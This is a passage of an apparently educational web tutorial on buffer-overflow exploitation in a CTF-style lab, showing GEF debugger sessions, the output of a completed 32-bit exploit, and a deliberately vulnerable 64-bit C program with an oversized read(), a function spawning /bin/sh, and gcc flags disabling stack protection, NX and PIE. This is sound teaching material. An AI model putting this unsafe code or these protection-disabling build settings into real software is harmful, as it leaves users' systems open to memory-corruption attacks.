style="color:#F8F8F2"><span class="token plain">üéâ Congratulations</span><span class="token operator">!</span><span class="token plain"> You&#x27;ve exploited the </span><span class="token number">32</span><span class="token plain">-bit binary</span><span class="token operator">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üö© Flag: CTF</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain">32bit_buffer_overflow_mastered</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Inferior </span><span class="token number">1</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">process </span><span class="token number">12345</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> exited normally</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="detailed-32-bit-analysis-commands">Detailed 32-bit Analysis Commands<a href="#detailed-32-bit-analysis-commands" class="hash-link" aria-label="Direct link to Detailed 32-bit Analysis Commands" title="Direct link to Detailed 32-bit Analysis Commands" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Additional analysis for understanding the exploit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ vmmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"> Legend:  Code </span><span class="token operator">|</span><span class="token plain"> Heap </span><span class="token operator">|</span><span class="token plain"> Stack </span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Start      End        Offset     Perm Path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08048000 0x08049000 0x00000000 r-- /home/user/vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x08049000 0x0804a000 0x00000000 r-x /home/user/vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0804a000 0x0804b000 0x00001000 r-- /home/user/vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0804b000 0x0804c000 0x00002000 rw- /home/user/vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Examine the win function in detail</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dump of assembler code </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> win:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049169 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:     push   ebp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804916a </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:     mov    ebp,esp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804916c </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">3</span><span class="token operator">&gt;</span><span class="token plain">:     sub    esp,0x8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804916f </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:     sub    esp,0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049172 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain">:     push   0x8049220</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049177 </span><span class="token operator">&lt;</span><span class="token plain">+1</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804917c </span><span class="token operator">&lt;</span><span class="token plain">+1</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804917f </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">2</span><span class="token operator">&gt;</span><span class="token plain">:    sub    esp,0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049182 </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    push   0x8049250</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049187 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804918c </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804918f </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">8</span><span class="token operator">&gt;</span><span class="token plain">:    sub    esp,0xc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049192 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:    push   0x8049284</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x08049197 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x8049050 </span><span class="token operator">&lt;</span><span class="token plain">system@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804919c </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:    </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain">    esp,0x10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0804919f </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    nop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491a0 </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    leave</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x080491a1 </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:    ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">End of assembler dump.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stack layout analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info frame</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Stack level </span><span class="token number">0</span><span class="token plain">, frame at 0xffffd1c8:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> eip </span><span class="token operator">=</span><span class="token plain"> 0x80491c8 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> vulnerable_function </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">vuln32.c:12</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> saved eip </span><span class="token operator">=</span><span class="token plain"> 0x8049214</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> called by frame at 0xffffd1e8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">source</span><span class="token plain"> language c.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Arglist at 0xffffd1c0, args: </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">input</span><span class="token operator">=</span><span class="token plain">0xffffd2a4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Locals at 0xffffd1c0, Previous frame&#x27;s sp is 0xffffd1c8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Saved registers:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ebp at 0xffffd1c0, eip at 0xffffd1c4</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-2-64-bit-buffer-overflow-with-rop-chain">Example 2: 64-bit Buffer Overflow with ROP Chain<a href="#example-2-64-bit-buffer-overflow-with-rop-chain" class="hash-link" aria-label="Direct link to Example 2: 64-bit Buffer Overflow with ROP Chain" title="Direct link to Example 2: 64-bit Buffer Overflow with ROP Chain" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="target-application-vuln64c">Target Application (vuln64.c)<a href="#target-application-vuln64c" class="hash-link" aria-label="Direct link to Target Application (vuln64.c)" title="Direct link to Target Application (vuln64.c)" translate="no">‚Äã</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">// vuln64.c - 64-bit vulnerable application with ROP requirements</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">win</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üéâ You found the win function!\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üö© But you need ROP to get the flag...\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">get_flag</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üéØ Flag function reached!\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üö© Flag: CTF{64bit_rop_chain_mastered}\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">vulnerable_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">64</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìù Enter your input: &quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">fflush</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token constant" style="color:rgb(189, 147, 249)">stdout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">read</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">200</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">// Vulnerable read - buffer overflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìã You entered: %s\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üéØ 64-bit ROP Chain Challenge\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìç Win function: %p\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> win</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìç Flag function: %p\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> get_flag</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">vulnerable_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;‚úÖ Function returned normally\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="compilation-and-setup-1">Compilation and Setup<a href="#compilation-and-setup-1" class="hash-link" aria-label="Direct link to Compilation and Setup" title="Direct link to Compilation and Setup" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Compile 64-bit vulnerable binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-g</span><span class="token plain"> -fno-stack-protector </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-z</span><span class="token plain"> execstack -no-pie </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> vuln64 vuln64.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Verify compilation and security features</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">checksec vuln64</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="gef-analysis-session-1">GEF Analysis Session<a href="#gef-analysis-session-1" class="hash-link" aria-label="Direct link to GEF Analysis Session" title="Direct link to GEF Analysis Session" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start GDB with GEF for 64-bit binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gdb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-q</span><span class="token plain"> vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Security analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> checksec </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/home/user/vuln64&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Canary                        </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NX                            </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PIE                           </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Fortify                       </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> ‚úò </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RelRO                         </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> Partial</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Analyze functions and find ROP gadgets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">All defined functions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401000  _init</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401030  printf@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401040  fflush@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401050  read@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401060  system@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401070  __libc_start_main@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401080  _start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00000000004010b0  deregister_tm_clones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00000000004010f0  register_tm_clones</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401130  __do_global_dtors_aux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401170  frame_dummy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401179  win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00000000004011a5  get_flag</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00000000004011d1  vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401211  main</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Get function addresses</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print win</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$1</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token operator">&lt;</span><span class="token plain">text variable, no debug info</span><span class="token operator">&gt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> 0x401179 </span><span class="token operator">&lt;</span><span class="token plain">win</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print get_flag</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$2</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token operator">&lt;</span><span class="token plain">text variable, no debug info</span><span class="token operator">&gt;</span><span 